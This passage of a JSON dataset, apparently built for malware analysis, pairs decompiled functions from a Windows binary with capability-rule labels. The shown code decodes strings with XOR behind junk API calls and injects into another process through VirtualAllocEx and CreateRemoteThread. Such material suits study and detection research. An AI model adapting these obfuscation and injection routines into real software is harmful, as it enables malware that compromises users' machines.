*0x41daa8) != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar4)(0, var_8h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, var_14h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, iVar6);\n                (*pcVar7)(uVar1);\n                goto code_r0x00402d27;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar4)(0, var_8h);\n            (*pcVar7)(uVar1);\n            uVar1 = (*pcVar4)(0, var_14h);\n        }\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar4)(0, iVar6);\n        (*pcVar7)(uVar1);\n    }\n    else {\ncode_r0x00402d27:\n        puVar5 = 0x41da94;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_2ch = *puVar5;\n            puVar5 = puVar5 + 1;\n            var_2ch = var_2ch + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2358
    },
    "00402d3d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00402d3d(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uchar *var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_2ch = param_1;\n    if ((((*0x41daac | *0x41dab0) == 0) || ((*0x41dab4 | *0x41dab8) == 0)) || ((*0x41dabc | *0x41dac0) == 0)) {\n        var_4h = 0x7f;\n        var_38h = 0xf0e380d;\n        var_34h = 0x20071c21;\n        var_1ch = 6;\n        var_30h._0_2_ = 0x6306;\n        var_28h = 0x636a4c63;\n        var_24h._0_2_ = 0x324d;\n        var_10h = param_2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_ch = iVar2;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar3 != 0x2501ed) {\n                *(iVar7 + iVar2) = *(&var_28h + iVar7 % var_1ch) ^ (iVar7 + iVar2)[&var_38h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_38h = 0x75072a3f;\n        var_34h = 0x312a1222;\n        var_30h._0_2_ = 0x2155;\n        var_30h._2_1_ = 0x73;\n        var_28h = 0x39754e73;\n        var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x4d);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_20h = 5;\n        iVar7 = 0;\n        var_14h = iVar2;\n        var_8h = &var_38h - iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            iVar3 = var_ch;\n            if (iVar4 != 0xebd747) {\n                *(iVar7 + iVar2) = *(&var_28h + iVar7 % var_20h) ^ (iVar7 + iVar2)[&var_38h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41daac = fcn.0040aa0e(iVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41daac == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_50h = 0x32370304;\n            var_4ch = 0x15183d37;\n            var_48h = 0x2d37162a;\n            var_44h = 0x3420153d;\n            var_40h = 0x23a2d36;\n            var_3ch._0_2_ = 0x636;\n            var_3ch._2_1_ = 0x52;\n            var_34h = 0x75456748;\n            var_30h._0_2_ = 0x4952;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_28h = &var_50h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n                iVar3 = var_ch;\n                if (iVar4 != 0xdb790d) {\n                    *(iVar7 + iVar2) = *(&var_34h + iVar7 % var_1ch) ^ (iVar7 + iVar2)[&var_50h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41dab4 = fcn.0040aa0e(iVar2);\n            iVar2 = var_14h;\n            if (*0x41dab4 == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar8)(0, iVar3);\n                (*pcVar5)(uVar1);\n                goto code_r0x00403073;\n            }\n            var_50h = 0x31233909;\n            var_4ch = 0x102b270c;\n            var_48h = 0x3c3a3537;\n            var_44h = 0x3f023607;\n            var_40h = 0xc2e1603;\n            var_3ch._0_2_ = 0x3721;\n            var_3ch._2_1_ = 0x73;\n            var_1ch = 0x43734e53;\n            var_18h._0_1_ = 99;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_28h = &var_50h - iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n                iVar3 = var_ch;\n                if (iVar4 != 0x8b8068) {\n                    *(iVar7 + iVar2) = *(&var_1ch + iVar7 % var_20h) ^ (iVar7 + iVar2)[&var_50h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41dabc = fcn.0040aa0e(iVar2);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x41dabc != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_8h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*pcVar8)(uVar1);\n                goto code_r0x00403066;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, var_8h);\n            (*pcVar8)(uVar1);\n            uVar1 = (*pcVar5)(0, var_14h);\n        }\n        (*pcVar8)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar8)(uVar1);\n    }\n    else {\ncode_r0x00403066:\n        puVar6 = 0x41daac;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_2ch = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_2ch = var_2ch + 1;\n        }\n    }\ncode_r0x00403073:\n    *0x41dac0 = *0x41dabc >> 0x20;\n    *0x41dab8 = *0x41dab4 >> 0x20;\n    *0x41dab0 = *0x41daac >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2281
    },
    "00403244": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403244(int32_t *arg_8h, int32_t arg_ch, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *arg_8h_00;\n    uchar *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    int16_t *piVar10;\n    uint uVar11;\n    int32_t iVar12;\n    int32_t unaff_EDI;\n    int64_t iVar13;\n    uint uVar14;\n    int32_t iStack148;\n    int32_t *piStack144;\n    uchar *puStack140;\n    uint uVar15;\n    uchar *noname_1;\n    int16_t *piStack124;\n    uint uStack120;\n    uint32_t uStack116;\n    uint uStack112;\n    uchar auStack108 [4];\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    ushort uStack84;\n    uchar uStack82;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    puStack140 = 0x403256;\n    uStack116 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack116 = uStack116 & 0xff;\n    iStack104 = 0;\n    piVar1 = arg_8h + 1;\n    uStack96 = piVar1;\n    if (*piVar1 != 0) {\n        puStack140 = *piVar1;\n        piStack144 = 0x403279;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar1 = 0;\n    }\n    uVar11 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41dadc & 1) != 0)) {\n        uStack120 = 0x5;\n        iVar13 = CONCAT44(5, uStack116);\n        if (uStack116 == 5) {\n            if ((*0x41ddd0 | *0x41ddd4) == 0) {\n                puStack140 = 0x4032c5;\n                fcn.0040a4f9();\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puStack140 = 0xb;\n                piStack144 = 0x8;\n                uStack72 = 0xf0e380d;\n                uStack68 = 0x20071c21;\n                uStack64 = uStack64 & 0xffff0000 | 0x6306;\n                uStack80 = 0x636a4c63;\n                uStack76 = CONCAT22(uStack76._2_2_, 0x324d);\n                iStack148 = 0x403300;\n                iStack148 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                puVar6 = &stack0xffffffac + -iVar4;\n                iVar12 = 0;\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n                    if (iVar5 != 0x2501ed) {\n                        *(iVar12 + iVar4) = (&stack0xffffffa4)[iVar12 % unaff_EDI] ^ (iVar12 + iVar4)[puVar6];\n                    }\n                    iVar12 = iVar12 + 1;\n                } while (iVar12 < 10);\n                iVar12 = 8;\n                uStack68 = 0x75072a3f;\n                uStack64 = 0x312a1222;\n                uStack60 = uStack60 & 0xff000000 | 0x732155;\n                uStack100 = 0x39754e73;\n                uStack96 = CONCAT31(uStack96._1_3_, 0x4d);\n                (*pcVar9)();\n                arg_8h_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar4 = 0;\n                noname_1 = &stack0xffffffb0 + -arg_8h_00;\n                uVar11 = 0xffffffff;\n                puStack140 = arg_8h_00;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                    if (iVar5 != 0xebd747) {\n                        arg_8h_00[iVar4] = (&stack0xffffff90)[iVar4 % piStack144] ^ (arg_8h_00 + iVar4)[noname_1];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0xb);\n                iVar4 = unaff_EDI;\n                iVar13 = fcn.0040aa0e(arg_8h_00);\n                if (iVar13 != 0) {\n                    uVar14 = 8;\n                    uStack80 = 0x71517009;\n                    uStack76 = 0x341e6210;\n                    uStack72 = 0x700e6214;\n                    uStack68 = 0x62037156;\n                    uStack64 = 0x62143403;\n                    uStack60 = CONCAT22(uStack60._2_2_, 0x7062);\n                    iStack104 = 0x71347062;\n                    uStack100 = CONCAT31(uStack100._1_3_, 0x62);\n                    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                    uStack120 = iVar13 >> 0x20;\n                    uStack116 = iVar13;\n                    piStack124 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                    uStack120 = iVar13 >> 0x20;\n                    uStack116 = iVar13;\n                    iVar5 = 0;\n                    piStack144 = &stack0xffffffa4 + -piStack124;\n                    unaff_EDI = iVar4;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                        uStack120 = iVar13 >> 0x20;\n                        uStack116 = iVar13;\n                        if (iVar4 != 0x1023e5) {\n                            *(iVar5 + piStack124) =\n                                 (&stack0xffffff8c)[iVar5 % iVar12] ^\n                                 (iVar5 + piStack124)[&stack0xffffffa4 + -piStack124];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x16);\n                    arg_8h_00 = 0xc;\n                    iStack56 = piStack124 >> 0x1f;\n                    piVar10 = piStack124;\n                    do {\n                        iVar2 = *piVar10;\n                        piVar10 = piVar10 + 1;\n                    } while (iVar2 != puStack140);\n                    iVar2 = (piVar10 - (piStack124 + 1) >> 1) * 2;\n                    uStack64 = 0;\n                    uStack68 = CONCAT22(iVar2 + 2, iVar2);\n                    uStack60 = piStack124;\n                    iVar4 = fcn.00410000(puVar6, noname_1, 4, 0, 0, 0, 0, 0, &stack0xffffffbc, &stack0xffffffbc >> 0x1f\n                                         , &stack0xffffff94, &stack0xffffff94 >> 0x1f, uVar11, uVar14);\n                    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uStack120 = iVar13 >> 0x20;\n                    uStack116 = iVar13;\n                    if (iVar4 < 0) {\n                        uVar11 = fcn.004016a0();\n                        uStack120 = iVar13 >> 0x20;\n                        uStack116 = iVar13;\n                    }\n                    else {\n                        uStack92 = 0x18220704;\n                        uStack88 = 0x31000316;\n                        uStack84 = 0x1605;\n                        uStack82 = 0x6f;\n                        uStack116 = 0x7650626f;\n                        uStack112 = CONCAT31(uStack112._1_3_, 0x73);\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                        puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                        iVar5 = 0;\n                        puStack140 = &stack0xffffff98 + -puVar6;\n                        piStack144 = puVar6;\n                        do {\n                            iVar7 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                            if (iVar7 != 0xb562b3) {\n                                puVar6[iVar5] = (&stack0xffffff80)[iVar5 % 5] ^ (puVar6 + iVar5)[puStack140];\n                            }\n                            iVar5 = iVar5 + 1;\n                        } while (iVar5 < 0xb);\n                        iStack104 = 0x23263a34;\n                        uStack100 = 0x2d253741;\n                        uStack96 = 0x37412d2e;\n                        uStack92 = 0x27312023;\n                        uStack88 = uStack88 & 0xff000000 | 0x773654;\n                        piStack124 = 0x5235;\n                        uVar11 = (*pcVar9)(8, 0x14);\n                        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n                        iVar7 = 0;\n                        arg_8h_00 = &stack0xffffff8c + -iVar5;\n                        uVar11 = 0xffffffff;\n                        do {\n                            iVar8 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                            if (iVar8 != 0xb9d64e) {\n                                *(iVar7 + iVar5) = (&stack0xffffff74)[iVar7 % iVar4] ^ (iVar7 + iVar5)[arg_8h_00];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 0x13);\n                        *0x41ddd0 = fcn.0040aa0e(iVar5);\n                        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                        uVar14 = (*pcVar9)(0, iVar12);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                        iVar13 = CONCAT44(uStack120, uStack116);\n                    }\n                    uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piStack124);\n                    uStack120 = iVar13 >> 0x20;\n                    uStack116 = iVar13;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                    uStack120 = iVar13 >> 0x20;\n                    uStack116 = iVar13;\n                }\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h_00);\n                uStack120 = iVar13 >> 0x20;\n                uStack116 = iVar13;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                uStack120 = iVar13 >> 0x20;\n                uStack116 = iVar13;\n                uVar14 = (*pcVar9)(0, unaff_EDI);\n                uStack120 = iVar13 >> 0x20;\n                uStack116 = iVar13;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                uStack120 = iVar13 >> 0x20;\n                uStack116 = iVar13;\n                if (*0x41ddd0 == 0) goto code_r0x00403ae7;\n            }\n            *0x41ddd4 = *0x41ddd0 >> 0x20;\n            piStack144 = arg_8h + 3;\n            puStack140 = piStack144 >> 0x1f;\n            iStack148 = 0;\n            iVar4 = fcn.00410000(*0x41ddd0, *0x41ddd4, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, arg_ch, \n                                 arg_ch >> 0x1f, lpParameter, lpParameter >> 0x1f);\n            uStack120 = iVar13 >> 0x20;\n            uStack116 = iVar13;\n            arg_8h[1] = iVar4;\n            if (iVar4 == 0) goto code_r0x00403ae7;\n        }\n        else {\n            if ((*0x41ddd8 | *0x41dddc) == 0) {\n                puStack140 = 0xb;\n                piStack144 = 0x8;\n                uStack72 = 0xf0e380d;\n                uStack68 = 0x20071c21;\n                uStack64 = uStack64 & 0xffff0000 | 0x6306;\n                uStack80 = 0x636a4c63;\n                uStack76 = CONCAT22(uStack76._2_2_, 0x324d);\n                iStack148 = 0x403707;\n                iStack148 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                uStack100 = &stack0xffffffac + -iVar4;\n                iVar12 = 0;\n                iStack104 = iVar4;\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n                    if (iVar5 != 0x2501ed) {\n                        *(iVar12 + iVar4) = (&stack0xffffffa4)[iVar12 % unaff_EDI] ^ (iVar12 + iVar4)[uStack100];\n                    }\n                    iVar12 = iVar12 + 1;\n                } while (iVar12 < 10);\n                uStack44 = 0x36012122;\n                uStack40 = 0x21111d3a;\n                uStack36 = 0x1d3b2008;\n                uStack32 = 0x7050102;\n                uStack28 = 0x5514192d;\n                uStack92 = 0x756d5570;\n                uStack88 = CONCAT22(uStack88._2_2_, 0x7848);\n                (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar12 = 0;\n                uStack112 = &stack0xffffffc8 + -iVar4;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                    if (iVar5 != 0x2e5629) {\n                        *(iVar12 + iVar4) =\n                             (&stack0xffffff98)[iVar12 % iStack148] ^ (iVar12 + iVar4)[&stack0xffffffc8 + -iVar4];\n                    }\n                    iVar12 = iVar12 + 1;\n                } while (iVar12 < 0x14);\n                fcn.0040a4f9();\n                uVar3 = uStack116;\n                uVar11 = 0xffffffff;\n                *0x41ddd8 = fcn.0040aa0e(iVar4);\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n                (*pcVar9)(uVar14);\n                if (*0x41ddd8 == 0) goto code_r0x00403ae7;\n            }\n            *0x41dddc = *0x41ddd8 >> 0x20;\n            uVar11 = 0xffffffff;\n            piStack144 = &stack0xffffffb8;\n            puStack140 = piStack144 >> 0x1f;\n            iStack148 = arg_8h + 1 >> 0x1f;\n            iVar4 = fcn.00410000(*0x41ddd8, *0x41dddc, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            if (iVar4 < 0) goto code_r0x00403ae7;\n        }\n        uVar11 = 0;\n    }\n    else {\n        puStack140 = 0x20;\n        piStack144 = 0x3000;\n        iStack148 = 5;\n        iVar4 = *arg_8h;\n        uStack112 = NULL;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)();\n        pcVar9 = _sym.imp.KERNEL32.dll_VirtualProtectEx;\n        if (iVar12 == 0) {\n            puStack140 = arg_ch;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(*arg_8h, iVar12, 5, 0x40);\n            fcn.00403b31(iVar12);\n            fcn.00403af0(&stack0xffffff88);\n            (*pcVar9)(*arg_8h, iVar12, 5, 0x20, &stack0xffffff60);\n        }\n        if (unaff_EDI == 5) {\n            uVar11 = 0;\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, puStack140, lpParameter, 0);\n            arg_8h[1] = iVar4;\n            if (iVar4 == 0) {\n                uVar11 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            else {\n                piStack144 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar4, 30000);\n                if (piStack144 == NULL) {\n                    (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(arg_8h[1], &stack0xffffff70);\n                }\n            }\n        }\n        else {\n            uStack76 = 0xf0e380d;\n            uStack72 = 0x20071c21;\n            piStack144 = 0x6;\n            uStack68 = uStack68 & 0xffff0000 | 0x6306;\n            uStack120 = CONCAT22(uStack120._2_2_, 0x324d);\n            iVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            uStack120 = &stack0xffffffa8 + -iVar5;\n            iVar7 = 0;\n            do {\n                iVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                if (iVar8 != 0x2501ed) {\n                    *(iVar7 + iVar5) = (&stack0xffffff78)[iVar7 % iVar4] ^ (iVar7 + iVar5)[uStack120];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 10);\n            uVar14 = 8;\n            uStack64 = 0x36012122;\n            uStack60 = 0x21111d3a;\n            iStack56 = 0x1d3b2008;\n            uStack52 = 0x7050102;\n            uStack48 = 0x5514192d;\n            uVar15 = 0x756d5570;\n            uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            iVar5 = 0;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                if (iVar7 != 0x2e5629) {\n                    *(iVar5 + iVar4) = (&stack0xffffff6c)[iVar5 % iVar12] ^ (iVar5 + iVar4)[&stack0xffffffb4 + -iVar4];\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 0x14);\n            uVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar15, iVar4);\n            pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar11);\n            uVar11 = 0xffffffff;\n            if (pcVar9 != NULL) {\n                iVar12 = (*pcVar9)(*arg_8h, 0, 0, 0, 0, 0, uVar14, lpParameter, 0, &stack0xffffff80);\n                if (iVar12 < 0) {\n                    uVar11 = fcn.004016a0();\n                }\n                else {\n                    piStack144 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(_pe_dos_header, 30000);\n                    if (piStack144 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(_pe_dos_header, &stack0xffffff70);\n                    }\n                    uVar11 = 0;\n                }\n            }\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar15);\n            (*pcVar9)(uVar14);\n        }\n    }\ncode_r0x00403ae7:\n    *0x41dddc = *0x41ddd8 >> 0x20;\n    *0x41ddd4 = *0x41ddd0 >> 0x20;\n    return uVar11;\n}\n",
        "token_count": 5026
    },
    "00403b64": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403b64(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uchar *puVar13;\n    int32_t *piVar14;\n    uchar *unaff_ESI;\n    uchar *puVar15;\n    int32_t iVar16;\n    uchar *puVar17;\n    uchar *puVar18;\n    uint32_t uVar19;\n    uchar *puStack988;\n    uint32_t uStack984;\n    int32_t iStack980;\n    uint uStack972;\n    uint uStack968;\n    uint uStack964;\n    uint32_t uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    uint32_t uStack932;\n    uchar *puStack928;\n    int32_t iStack924;\n    uint uStack920;\n    int32_t iStack916;\n    uint uStack912;\n    uint uStack908;\n    ushort uStack904;\n    uchar uStack902;\n    uint uStack901;\n    uint uStack897;\n    uint uStack893;\n    uint32_t uStack889;\n    uint uStack885;\n    ushort uStack881;\n    uchar uStack879;\n    uchar uStack878;\n    uint uStack877;\n    uint uStack873;\n    uchar uStack869;\n    uchar uStack868;\n    uint uStack867;\n    uchar uStack863;\n    int32_t iStack860;\n    uint uStack856;\n    uchar uStack852;\n    uint uStack844;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack804;\n    uchar auStack740 [88];\n    int32_t iStack652;\n    uint uStack636;\n    \n    uStack948 = 0x208;\n    uStack952 = 8;\n    uStack956 = 0x403b88;\n    uStack956 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    uStack960 = 0x403b91;\n    puStack928 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack908 = 0x46356550;\n    iStack860 = 0;\n    uStack856 = 0;\n    uStack852 = 0;\n    iStack916 = 0;\n    uStack844 = 0;\n    puVar13 = &stack0xfffffcd4;\n    for (iVar12 = 0x44; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack812 = 0x44;\n    puVar13 = &stack0xfffffcb8;\n    for (iVar12 = 0x10; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack904 = 0x384d;\n    uStack901 = 0x51461265;\n    puVar13 = &stack0xfffffd1c;\n    for (iVar12 = 0x2cc; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack897 = 0x34651838;\n    uStack893 = 0x1a385b46;\n    puVar13 = puStack928;\n    for (iVar12 = 0x208; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack960 = 0x5d;\n    uStack964 = 8;\n    uStack912 = 6;\n    uStack902 = 6;\n    uStack889 = 0x11461265;\n    uStack885 = 0x35652938;\n    uStack881 = 0x4d46;\n    uStack879 = 0x38;\n    uStack877 = 0x51461265;\n    uStack873 = 0x55651838;\n    uStack869 = 0x46;\n    uStack867 = 0x66652938;\n    uStack863 = 0x46;\n    iStack924 = 0x46666575;\n    uStack920 = CONCAT22(uStack920._2_2_, 0x3834);\n    uStack968 = 0x403c79;\n    uStack878 = uStack902;\n    uStack868 = uStack902;\n    uStack968 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack972 = 0x403c7c;\n    iVar12 = (*pcVar4)();\n    iVar16 = 0;\n    iStack860 = iVar12;\n    do {\n        uStack972 = 0x403c92;\n        iVar5 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar5 != 0x67e73c) {\n            *(iVar16 + iVar12) = (&stack0xfffffc58)[iVar16 % iStack924] ^ (iVar16 + iVar12)[&stack0xfffffc68 + -iVar12];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 